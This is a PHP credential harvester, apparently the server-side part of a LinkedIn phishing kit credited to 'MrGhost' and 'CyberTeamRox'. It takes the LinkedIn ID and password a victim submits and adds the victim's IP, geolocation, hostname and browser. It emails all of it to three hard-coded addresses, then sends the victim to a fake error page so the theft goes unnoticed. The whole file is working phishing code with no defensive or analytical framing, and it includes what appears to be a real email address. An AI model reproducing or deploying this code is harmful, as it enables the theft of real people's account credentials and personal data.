<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$time = date("m-d-Y g:i:a");

$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;


date_default_timezone_set("Africa/Lagos");

$log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$email = $_POST['session_key'];
$pass = $_POST['oass'];
$own = 'anitagomezy@gmail.com';
$owner = 'anitagomezy@gmail.com';
$owners = 'GanGsootmail.com';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a"); 
$sender = 'anitagomezy@gmail.com';




$subj = "CyberTeamRox-Linkedin $country | $state | $ip ReZulT ";
$headers .= "From: MrGhost<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$message = "<HTML><BODY>
 <TABLE>
 <tr><td>---------=LinkedIn MrGhost|CyberTeamRox=---------</td></tr>
 LINKEDIN ID: $email <br>
 PASSWORD: $pass <br>
---------=IP Adress & Date=--------- <br>
 IP: <a href='http://www.xmyip.com/ip/$ip' target='_blank'>$ip</a> <br>
 HostName: $hostname<br>
 Country: '$country' | State: '$state' | City: '$city'\n <br>
 USER-WEB-BROWSER: '$browser' <br>
 Date: $log_date  Stime<br>
---------=Moded By MrGhost*=--------- <br>
</BODY>
 </HTML>";

if (empty($email) || empty($pass)) 
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
else {
mail($own,$subj,$message,$headers);
mail($owner,$subj,$message,$headers);
mail($owners,$subj,$message,$headers);
header("Location: error.htm");
}
?>